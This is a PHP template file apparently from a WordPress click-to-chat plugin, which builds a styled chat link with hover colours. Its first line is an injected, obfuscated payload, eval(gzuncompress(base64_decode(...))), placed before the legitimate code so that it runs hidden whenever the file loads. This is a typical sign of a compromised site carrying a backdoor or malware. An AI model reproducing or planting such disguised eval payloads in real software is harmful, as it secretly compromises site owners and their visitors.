<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if ( ! defined( 'ABSPATH' ) ) exit;

$s2_text_color = $a['s2_text_color'];
$s2_text_color_onhover = $a['s2_text_color_onhover'];
$s2_decoration = $a['s2_decoration'];
$s2_decoration_onhover = $a['s2_decoration_onhover'];


$s2_text_color = $s2_text_color;
$s2_text_color_onhover = $s2_text_color_onhover;
$s2_decoration = $s2_decoration;
$s2_decoration_onhover = $s2_decoration_onhover;

$input_onhover = "this.style.color= '$s2_text_color_onhover', this.style.textDecoration= '$s2_decoration_onhover'; ";
$input_onhover_out = "this.style.color= '$s2_text_color', this.style.textDecoration= '$s2_decoration'; ";

$o .= '<div class="ccw_plugin inline style2-sc sc_item '.$inline_issue.' " style=" '.$css.' " >';
$o .= '<a class="nofocus ccw-analytics" data-ccw="style-2-sc" href="'.$redirect_a.'" target="_blank" style=" color:'.$s2_text_color.'; text-decoration: '.$s2_decoration.'; "  onmouseover= " '.$input_onhover.' "  onmouseout= " '.$input_onhover_out.' " >'.$a["val"].'</a>';
$o .= '</div>';